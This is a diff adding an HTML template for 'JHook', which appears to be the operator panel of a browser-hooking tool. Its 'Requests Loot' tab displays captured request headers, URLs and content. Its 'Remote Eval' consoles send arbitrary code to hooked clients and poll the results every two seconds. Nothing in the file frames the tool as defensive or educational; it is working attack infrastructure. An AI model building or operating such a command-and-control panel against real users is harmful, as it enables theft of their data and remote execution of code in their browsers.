@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/static/dark.css">
+    <link rel="stylesheet" href="/static/main.css">
+    <title>{{ hook.name }} Hook | JHook</title>
+</head>
+
+<body>
+    <div>
+        <h2>
+            {{ hook.name }}
+        </h2>
+        <div>
+            <button type="button" onclick="window.location ='{{  url_for('hooks') }}'">↩️</button>
+            <button type="button" onclick="window.location ='{{  url_for('edit_hook', id=hook.id) }}'">✏️</button>
+        </div>
+        <div class="hook-view">
+            <div class="center">
+                <button class="hook-section" id="hook-section">
+                    💰 Requests Loot
+                </button>
+                <button class="console-section" id="console-section">
+                    🕹️🔙🖥️ Remote Eval
+                </button>
+            </div>
+            <div style="flex-grow: 1;">
+                <div id="requests">
+                    {% if reqs_len == 0 %}
+                    <div class="center">
+                        No requests to view
+                    </div>
+                    {% endif %}
+                    {% for r in reqs %}
+                    <details>
+                        <summary> <span class="req-method">{{ r.method }}</span>{{ r.date.strftime("%d/%m/%Y %H:%M") }}
+                            - ({{ types[r.contentType] }}) </summary>
+                        <p>
+                        <div style="text-align: center">
+                            <h3>{{ r.title }}</h3>
+                        </div>
+                        <div style="margin: 10px;">
+                            <h3>Content</h3>
+                            {% if r.contentType == 1 %}
+                            <iframe id="iframe-{{ r.id }}" src="{{ url_for('get_content', id=r.content) }}" sandbox=""></iframe>
+                            <button onclick="fullscreen({{ r.id }})">Fullscreen</button>
+                            {% elif r.contentType == 3 %}
+                            <img src="{{ url_for('get_content', id=r.content) }}"></img>
+                            {% else %}
+                            <code data-src="{{ url_for('get_content', id=r.content) }}"></code>
+                            {% endif %}
+                        </div>
+                        <a href="{{ url_for('get_content', id=r.content) }}" download>Download request content</a>
+                        <h3>Headers</h3>
+                        <code>{{ r.headers.strip() }}</code>
+                        {% if r.queryString %}
+                        <h3>Query String</h3>
+                        <code>{{ r.queryString.strip() }}</code>
+                        {% endif %}
+                        <h3>URL</h3>
+                        <code>{{ r.url.strip() }}</code>
+                        </p>
+                    </details>
+                    {% endfor %}
+                </div>
+                <div class="center" id="console-list" style="display: none;">
+                    {% for c in consoles %}
+                        <button onclick="openEval('{{ c }}')">
+                            🟢 {{ c }}
+                        </button>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+    <dialog id="eval-dialog">
+        <header id="c-eval"></header>
+            <textarea id="eval-logs" readonly rows="20" cols="45" style="font-size:13px;"></textarea>
+            <div class="center" style="flex-direction: row;">
+                <input type="text" id="eval-input" style="font-size:14px;">
+                <button id="eval-send">📨</button>
+            </div>
+            <menu>
+                <button onclick="document.getElementById('eval-dialog').close();clearInterval(window.fl);">Close</button>
+            </menu>
+    </dialog>
+    <script>
+        window.addEventListener("DOMContentLoaded", () => {
+            let reqs = document.getElementById("requests");
+            let consoles = document.getElementById("console-list");
+            document.getElementById("hook-section").addEventListener("click", () => {
+                reqs.style.display = "block";
+                consoles.style.display = "none";
+            });
+            document.getElementById("console-section").addEventListener("click", () => {
+                reqs.style.display = "none";
+                consoles.style.display = "flex";
+            });
+            document.querySelectorAll("code[data-src]").forEach(e => {
+                fetch(e.dataset.src).then(r => r.text()).then(t => e.innerText = t);
+            });
+            let evalSend = document.getElementById("eval-send");
+            let evalInput =  document.getElementById("eval-input");
+            const sendCmd = async () => {
+                await fetch(`/send-eval/{{ hook.xid }}/${window.rmEval}`, {
+                    method: "POST",
+                    body: evalInput.value
+                });
+                evalInput.value = "";
+            }
+
+            evalSend.addEventListener("click", sendCmd);
+            evalInput.addEventListener("keyup", function(event) {
+                if (event.key === "Enter") {
+                    sendCmd();
+                }
+            });
+        });
+        function fullscreen(id) {
+            let el = document.getElementById(`iframe-${id}`);
+            if (el.requestFullscreen) {
+                el.requestFullscreen();
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
+            } else if (el.msRequestFullscreen) {
+                el.msRequestFullscreen();
+            }
+        }
+        function openEval(name) {
+            document.getElementById("eval-logs").value = "";
+            document.getElementById("c-eval").innerText = `${name} Eval Console`;
+            window.rmEval = name;
+            try { clearInterval(window.fl); } catch {}
+            window.fl = setInterval(async () => {
+                let r = await fetch(`/eval-logs/{{ hook.xid }}/${name}`,);
+                let logs = await r.json();
+                document.getElementById("eval-logs").value = logs.join("\n");
+            }, 2000);
+            document.getElementById("eval-dialog").showModal();
+        }
+    </script>
+</body>
+</html>
